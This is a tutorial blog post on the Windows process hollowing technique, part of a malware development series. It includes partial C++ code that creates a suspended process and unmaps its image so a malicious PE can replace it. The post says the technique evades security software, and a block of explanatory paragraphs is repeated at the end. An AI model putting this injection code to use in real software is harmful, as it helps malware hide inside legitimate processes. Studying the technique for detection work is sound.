---
title: 'Malwares Development Series | Part 3 : Process Injection | Process Hollowing'
published: 2024-07-29
description: ''
image: ''
tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
category: 'Malwares'
draft: false 
---

Hello, as a continuaton on our walkthrough about malwares techniques, Today we will cover the Process Hollowing technique.
During this blog, we'll follow this plan :

- **What is Process Hollowing ?**
- **How Process Hollowing works ?**
- **Process Hollowing Implementation**

Note : This Technique requires a deep understanding to Windows Process Mechanisms like PEB and MEMORY stuffs, So i recommende you to go take a look on them.

So let's begin

## What is Process Hollowing

First, we need to clarify the term "Hollowing", "Hollowed out" in the context of process hollowing refers to the act of removing or unmapping the legitimate code from a process's memory space and replacing it with malicious code.

So we can say that Process hollowing is a technique used to inject malicious code into a legitimate process. The process is essentially "hollowed out" and replaced with malicious code, which then runs under the guise of the legitimate process. Guess what, This technique is often used to evade detection by security software because the malicious code is running within a process that appears legitimate. Interesting huh ?

## How Process Hollowing works ?

The Process Hollowing operates on six important steps which are :

- **Create a Suspended Process**

First, we create a new instance of a legitimate process (e.g., notepad.exe) in a suspended state using CreateProcess with the CREATE_SUSPENDED flag. This means the process is created but not yet executed.

- **Unmap the Process's Memory**

Then, we use ZwUnmapViewOfSection or a similar API call to unmap the memory of the main executable image of the suspended process. This effectively "hollows out" the process.

- **Allocate Memory in the Process**
    
Allocates memory within the hollowed-out process using VirtualAllocEx.

- **Write Malicious Code to the Process**

We write the malicious code or the new executable image into the allocated memory of the suspended process using WriteProcessMemory.

- **Adjust Base Adresses ( The hard part )**

The purpose of this process is to ensure that all addresses within the loaded image are correctly adjusted to reflect the new base address in memory. This is necessary because the image may not always be loaded at its preferred base address, requiring relocation to function correctly.

- **Set Entry Point**
    
We modifie the entry point of the suspended process to point to the malicious code. This can be done by modifying the PEB (Process Environment Block) structure or by changing the CONTEXT of the process.

- **Resume the Process**
    
Finally, we need to resume the suspended process using ResumeThread. The process starts executing the malicious code instead of the original legitimate code.

## C++ Implamentation

Starting with importing the necessary libraries :

```cpp
#include <windows.h>
#include "internals.h"
#include "pe.h"
```

### Suspended Process Creation

So as we said we should create a new instance of a legitimate process ( Notepade ) in a suspended state, why, because we should unmap its original code and replace it with our malicious one before the execution of its main thread.

Let us create a function named ```CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)``` , The pSourceFile is our malicious code (PE).
```cpp
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile){

    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    
    CreateProcessA(
        0,
        pDestCmdLine,      
        0, 
        0, 
        0, 
        CREATE_SUSPENDED, 
        0, 
        0, 
        pStartupInfo, 
        pProcessInfo
    );

    if (!pProcessInfo->hProcess)
    {
        printf("Error creating process\r\n");
        return;
    }
}
```
So as you can see there is two new structures that I used, STARTUPINFOA and PROCESS_INFORMATION, which are two crucial structures that provide information about the startup configuration and state of the new process and its primary thread.

You can find more a about them in Windows APIs documentation here [STARTUPINFOA]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa') and here [PROCESS_INFORMATION]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information')

### Unmap the target process's memory

So after creating the suspended process, let's Unmap it.

Before doing that, we should know about the PEB structure, the PEB is a data structure in the Windows operating system that holds information about a process. It includes details such as loaded modules, heap addresses, and the process image base address. Accessing the PEB of a target process is necessary to retrieve this critical information.

So let's take a pointer on the PEB with ReadRemotePEB() and load Image base address from it using ReadRemoteImage().

The purpose of reading the base address of the executable image is to know where the executable image of the process is loaded in memory.

After this step, we should get a handle on our malicious file that we want to replace the target's memory with, using CreateFileA(), reading it's content to a buffer and converts the raw image buffer (buffer) into a LOADED_IMAGE structure, which contains parsed information about the image.

So now while we got the necessary informations, let's Unmap the target's process memory with NtUnmapViewOfSection, imported from the ntdll.dll library.


```cpp
PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

    printf("Opening source image\r\n");

    HANDLE hFile = CreateFileA(
        pSourceFile,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }

    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
    CloseHandle(hFile);
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

    printf("Unmapping destination section\r\n");

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    DWORD dwResult = NtUnmapViewOfSection(
        pProcessInfo->hProcess, 
        pPEB->ImageBaseAddress
    );

    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }
```

Before doing the unmaping, we should know about the PEB structure, the PEB is a data structure in the Windows operating system that holds information about a process. It includes details such as loaded modules, heap addresses, and the process image base address. Accessing the PEB of a target process is necessary to retrieve this critical information.

So let's take a pointer on the PEB with ReadRemotePEB() and load Image base address from it using ReadRemoteImage().

The purpose of reading the base address of the executable image is to know where the executable image of the process is loaded in memory.

After this step, we should get a handle on our malicious file that we want to replace the target's memory with, using CreateFileA(), reading it's content to a buffer and converts the raw image buffer (buffer) into a LOADED_IMAGE structure, which contains parsed information about the image.

So now while we got the necessary informations, let's Unmap the target's process memory with NtUnmapViewOfSection, imported from the ntdll.dll library.


